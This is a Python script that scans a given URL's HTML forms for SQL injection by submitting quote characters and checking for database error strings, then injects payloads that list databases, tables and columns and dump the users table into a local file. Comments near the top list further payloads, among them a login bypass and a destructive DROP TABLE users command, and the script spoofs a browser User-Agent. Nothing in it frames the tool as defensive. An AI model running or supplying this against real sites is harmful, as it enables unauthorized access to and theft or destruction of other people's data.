import sys
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup as bs

# ' OR '1'='1
# admin', 'whatever', 'hackmail') --
# ') UNION SELECT * FROM users --
# '); DROP TABLE users; --
# '); SHOW TABLES; --
# '); SHOW COLUMNS FROM users; --
# '); SHOW DATABASES; --

show_databases = "'); SHOW DATABASES; -- "
show_table = "'); SHOW TABLES; -- "
show_columns = "'); SHOW COLUMNS FROM users; -- "
dump_all = "') UNION SELECT * FROM users -- "


if len(sys.argv) < 2:
    print("You need to provide at least 1 param")
    exit(1)


url = sys.argv[1]
s = requests.Session()
type_action = "get"
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"


def get_all_forms(url):
    soup = bs(s.get(url).content, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        if (type_action != form.get("method")):
            forms.remove(form)
    return forms


def get_form_details(form):
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_id = input_tag.attrs.get("id")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "id": input_id, "value": input_value})
    forms = {"script": form.attrs.get("action").lower(), "inputs": inputs}
    forms["submit"] = type_action
    return forms


def is_vulnerable(response):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "SQL error or missing"

    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False


def scan_sql_injection(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url} for the type {type_action}")
    for form in forms:
        form_details = get_form_details(form)
        for c in "')\"":
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "text" or input_tag["type"] == "email":
                    try:
                        data[input_tag["id"]] = c
                    except:
                        pass
                    break
            data[type_action] = ""
            url = urljoin(url, form_details["script"])
            if type_action == "post":
                res = s.post(url, data=data)
            elif type_action == "get":
                res = s.get(url, params=data)
            if is_vulnerable(res):
                print(f"Injection vulnerability detected for: {url}. Form: \n{form_details}")
                with open("show_databases.txt", "w") as f:
                    injector(url, form_details, show_databases, f)
                    injector(url, form_details, show_table, f)
                    injector(url, form_details, show_columns, f)
                    injector(url, form_details, dump_all, f)
                break
            else:
                print("[!] SQL Injection no vulnerability detected:")


def injector(url, form_details, injection, file):
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text" or input_tag["type"] == "email":
            try:
                data[input_tag["id"]] = injection
            except:
                pass
            break
    data[type_action] = ""
    res = s.get(url, params=data)
    res = res.content.decode().replace("<br>", "\n")
    res = res.replace("<br />", "\n")
    file.write(res)
    print(res)


scan_sql_injection(url)